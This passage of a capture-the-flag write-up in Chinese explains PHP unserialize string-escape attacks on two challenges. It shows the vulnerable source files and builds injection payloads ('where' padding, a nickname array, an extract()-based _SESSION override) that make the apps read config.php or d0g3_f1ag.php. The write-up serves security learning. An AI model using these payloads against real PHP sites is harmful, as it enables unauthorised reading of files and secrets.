<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$user-&gt;update_profile($username, serialize($profile));</code> 将填入的信息进行 序列化</p>
<blockquote>
<ol start="5">
<li>它的上传文件的存储路径是 <code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code> ，起不到 <code>.php</code> 或者是 <code>图片木马包含的作用</code>;</li>
<li>代码审计</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># register.php</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line">			<span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>注册成功，进入 index.php 进行下一步的登录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>登陆成功之后，进入 profile.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$profile = unserialize($profile);</code> 将填写的信息进行反序列化输出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到 flag 存在于 config.php 文件当中，我们想办法读取到 config.php</p>
<blockquote>
<p><strong>思路：</strong>在 profile.php 中存在 <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> ；而 <code>$profile</code> 是一个数组，里面是我们输入的信息。如果我们控制 <code>$profile[&#39;photo&#39;]</code> 为 <code>config.php</code> 那么 之后的 <code>&lt;?php echo $phone;?&gt;</code> 将会显示出 base64 编码后的 config.php 文件内容，我们就会获取到 flag。</p>
</blockquote>
<p><strong>测试：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=aaa&amp;o=config.php</span><br><span class="line">输出：a:<span class="number">4</span>:a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>更改 nickname 的值：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&amp;o=config.php</span></span><br><span class="line"><span class="string">输出：a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:3:&quot;</span><span class="number">123</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:10:&quot;</span><span class="number">123</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:34:&quot;</span><span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>字符增加替换 ，考虑到 update.php 以及 class.php 中的过滤，我们传入 数组 nickname[]</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<p><img src="https://i.loli.net/2021/06/13/Wd1MD8Af4JGy2pe.png" alt="image-20210613183651536"></p>
<p><img src="https://i.loli.net/2021/06/13/Na6dklr1qA8v2Yo.png" alt="image-20210613183539171"></p>
<p>解码得 flag</p>
<p><img src="https://i.loli.net/2021/06/13/zjiFCvMSHx7PDdO.png" alt="image-20210613183613090"></p>
<h2 id="2-5-字符减少-—-安洵杯-2019-easy-serialize-php"><a href="#2-5-字符减少-—-安洵杯-2019-easy-serialize-php" class="headerlink" title="2.5 字符减少 — [安洵杯 2019]easy_serialize_php"></a>2.5 字符减少 — [安洵杯 2019]easy_serialize_php</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php">题目链接</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>根据提示：?f=phpinfo</li>
</ol>
</blockquote>
<p>发现</p>
<p><img src="https://i.loli.net/2021/06/13/ZhFTAEVcpUiew78.png" alt="image-20210613154055563"></p>
<blockquote>
<ol start="2">
<li>auto_append_file 在任何页面输出前首先包含 d0g3_f1ag.php文件，猜测 flag存在于 该文件当中。那我们需要想办法读取到该文件；</li>
<li>当 <code>$function == &#39;show_image&#39;</code> 时，首先对 <code>$serialize_info</code> 进行反序列化，然后对其中 <code>$userinfo[&#39;img&#39;]</code> 进行base64解码之后，使用 <code>file_get_contents</code> 读取出文件；而 <code>$serialize_info</code> 正是我们所传入的 <code>$function</code> 在 进行 <code>filter()</code> 函数过滤之后的结果；</li>
</ol>
</blockquote>
<p>手动添加以下代码，输出查看序列化之后的内容：</p>
<p><img src="https://i.loli.net/2021/06/13/cjrJVkIPAGnb1To.png" alt="image-20210613164010874"></p>
<p>该 base64 编码 <code>Z3Vlc3RfaW1nLnBuZw==</code> 即是 <code>guest_img.png</code></p>
<blockquote>
<ol start="4">
<li>我们需要使 <code>键 img </code> 为 <code>d0g3_f1ag.php</code> 文件加密之后的内容；<code>ZDBnM19mMWFnLnBocA==</code> 是 <code>d0g3_f1ag.php</code></li>
</ol>
</blockquote>
<p>构造 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post 传参：</span><br><span class="line">   </span><br><span class="line">_SESSION[user]=a&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">p</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 </span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">128</span>) <span class="string">&quot;a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span> </span><br></pre></td></tr></table></figure>

<p>以上内容如果进行反序列化，将会报错，原因：</p>
<blockquote>
<ol start="5">
